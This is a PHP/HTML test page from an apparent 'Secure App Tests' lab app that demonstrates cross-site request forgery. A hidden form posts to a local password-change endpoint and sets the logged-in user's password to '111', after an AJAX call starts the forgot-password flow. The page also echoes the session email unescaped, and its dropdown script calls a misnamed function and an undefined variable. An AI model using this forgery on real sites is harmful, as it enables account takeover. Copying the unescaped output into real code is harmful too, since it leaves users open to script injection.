<?php
session_start();

/*Get DB connection*/
require_once "../src/DBController.php";
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="stylesheet" href="../resources/secure_app.css">
    <meta charset="utf-8" />
    <title>Secure App Tests - CSRF Test</title>
</head>

<body>
    <div id="wrapper">
        <header>
            <table class="header_table">
                <tbody>
                <tr>
                    <td class="lock"><img src="../resources/Header_Lock_Image.svg" style="width:9vh;" alt="Header_lock"></td>
                    <td class="title"><b>Secure App Tests</b></td>
                    <td class="header_table_cell"></td>
                </tr>
                </tbody>
            </table>
        </header>

        <main>
            <h1>Cross Site Request Forgery Test</h1>
            <p>Current logged in as: <span id="email"><?php echo $_SESSION['email'];?></span></p>
            <p>
                To test: Login first, then navigate to this page. Press the button. The user is now enrolled with CRN 111 even if they are not a student.
            </p>

            <label class="csrf_label">Cross Site Request Forgery:
            <select name="csrf" id="csrf" onchange="changeCSRF()">
                <optgroup label="CSRFType">
                    <option selected="selected" value="1" >Change logged in user's password</option>
                    <option value="2">Create an admin account</option>
                </optgroup>
            </select>

            <div id="maliciouscode">
                <form action="http://localhost:8000/src/ForgotPasswordChangeLogic.php" method="POST" onsubmit="return ajaxSend();" name="changepassword">
                    <input type="hidden" name="newpassword" value="111" />
                    <input type="hidden" name="confirmpassword" value="111" />
                    <button class="button_large" type="submit">Change user's password</button>
                </form>
            </div>
            <?php
            $sql =<<<EOF
                    Select * From Enrollment;
                    EOF;
                    $ret = $db->query($sql);
                echo "<h1>Enrollment Table Contents</h1>";
                while($row = $ret->fetchArray(SQLITE3_ASSOC) )
                {
                    echo "<p>CRN = " . $row['CRN'] . "\n</p>";
                    echo "<p>StudentID = " . $row['StudentID'] . "\n</p>";
                }
            ?>
        </main>
    </div>

    <script>
        function changeinjection ()
        {
            //get elements from page
            var csrf = document.getElementById("csrf");
            var maliciouscode = document.getElementById("maliciouscode");

            //change parts of page depending on selection
            try
            {
                while (maliciouscode.removeChild(maliciouscode.childNodes[0]) !== null)
                {
                    //tries to remove all previous elements in the div
                }
            }
            catch
            {
                //succeeds when it throws exception
            }

            if(csrf.options[csrf.selectedIndex].value === "1")
            {
                maliciouscode.innerHTML =
                    "<form action=\"http://localhost:8000/src/ForgotPasswordChangeLogic.php\" method=\"POST\" onsubmit=\"return ajaxSend();\" name=\"changepassword\">" +
                        "<input type=\"hidden\" name=\"newpassword\" value=\"111\" />" +
                        "<input type=\"hidden\" name=\"confirmpassword\" value=\"111\" />" +
                        "<button class=\"button_large\" type=\"submit\">Change user's password</button>" +
                    "</form>";
            }
            else if(csrf.options[csrf.selectedIndex].value === "2")
            {
                injectiondiv.innerHTML = ""
            }
        }

        function ajaxSend()
        {
            // (A) GET SEARCH TERMS
            var data = new FormData();
            data.append('email', document.getElementById("email").textContent);


            // (B) AJAX REQUEST (sets up Forgot Password to change the correct password)
            var xhr = new XMLHttpRequest();
            xhr.open('POST', "../src/ForgotPasswordLogic.php", true);
            xhr.onload = function () {
                document.changepassword.submit();
            }
            xhr.send(data);
            xhr.onloadend = function() {
                if(xhr.status === 404)
                    throw new Error(' replied 404');
            }
            return false;
        }
    </script>
</body>
